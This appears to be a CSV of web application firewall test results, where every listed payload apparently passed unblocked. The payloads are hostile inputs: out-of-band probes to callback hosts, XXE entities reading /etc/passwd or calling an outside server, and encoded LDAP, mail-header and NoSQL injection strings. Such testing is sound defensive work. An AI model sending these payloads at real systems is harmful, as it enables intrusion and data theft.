Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@w63gecoroprj5um8ypnd7r6in9t0hseg3.interact.sh",passed,200,UserAgent,Plain,community,community-user-agent,failed
"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/6.17.0.RELEASE iPhone12,8 iOS/14.5.1))",passed,200,UserAgent,Plain,community,community-user-agent,failed
mercuryboard_user_agent_sql_injection.nasl',passed,200,UserAgent,Plain,community,community-user-agent,failed
"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM ""netdoc:/etc/passwd"">]><foo>&data;</foo>",passed,200,XMLBody,Plain,community,community-xxe,failed
"<?xml version=""1.0"" encoding=""UTF-7""?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
",passed,200,XMLBody,Plain,community,community-xxe,failed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,passed,200,URLParam,Base64Flat,owasp,ldap-injection,failed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,passed,200,JSONRequest,Base64Flat,owasp,ldap-injection,failed
KCYodWlkPWFkbWluKSghKCYoMT0wKSh1c2VyUGFzc3dvcmQ9cSkpKSk,passed,200,HTMLForm,Base64Flat,owasp,ldap-injection,failed
Kih8KG9iamVjdGNsYXNzPSopKQ,passed,200,URLParam,Base64Flat,owasp,ldap-injection,failed
Kih8KG9iamVjdGNsYXNzPSopKQ,passed,200,HTMLForm,Base64Flat,owasp,ldap-injection,failed
Kih8KG9iamVjdGNsYXNzPSopKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,ldap-injection,failed
Kih8KG9iamVjdGNsYXNzPSopKQ,passed,200,JSONRequest,Base64Flat,owasp,ldap-injection,failed
userPassword:2.5.13.18:=123,passed,200,URLParam,URL,owasp,ldap-injection,failed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,passed,200,HTMLForm,Base64Flat,owasp,ldap-injection,failed
userPassword:2.5.13.18:=123,passed,200,HTMLForm,URL,owasp,ldap-injection,failed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,passed,200,HTMLMultipartForm,Base64Flat,owasp,ldap-injection,failed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,passed,200,JSONRequest,Base64Flat,owasp,ldap-injection,failed
dXNlclBhc3N3b3JkOjIuNS4xMy4xODo9MTIz,passed,200,URLParam,Base64Flat,owasp,ldap-injection,failed
userPassword:2.5.13.18:=123,passed,200,HTMLMultipartForm,URL,owasp,ldap-injection,failed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,passed,200,URLParam,Base64Flat,owasp,mail-injection,failed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,passed,200,HTMLForm,Base64Flat,owasp,mail-injection,failed
userPassword:2.5.13.18:=123,passed,200,JSONRequest,URL,owasp,ldap-injection,failed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,mail-injection,failed
DQpRVUlUDQo,passed,200,URLParam,Base64Flat,owasp,mail-injection,failed
DQpRVUlUDQo,passed,200,HTMLMultipartForm,Base64Flat,owasp,mail-injection,failed
DQpWMTAwIENBUEFCSUxJVFkNClYxMDEgRkVUQ0ggNDc5MQ,passed,200,URLPath,Base64Flat,owasp,mail-injection,failed
DQpRVUlUDQo,passed,200,HTMLForm,Base64Flat,owasp,mail-injection,failed
DQpRVUlUDQo,passed,200,URLPath,Base64Flat,owasp,mail-injection,failed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,passed,200,HTMLForm,Base64Flat,owasp,mail-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,passed,200,URLPath,Base64Flat,owasp,mail-injection,failed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,passed,200,URLParam,Base64Flat,owasp,mail-injection,failed
db.injection.insert%28%7Bsuccess:1%7D%29%3B,passed,200,URLPath,URL,owasp,nosql-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
ZGIuaW5qZWN0aW9uLmluc2VydCh7c3VjY2VzczoxfSk7,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
ClJDUFQgVE86IHRlc3RAZXZpbC5jb20K,passed,200,HTMLMultipartForm,Base64Flat,owasp,mail-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
dHJ1ZSwgJHdoZXJlOiAnOTkgPT0gODgn,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
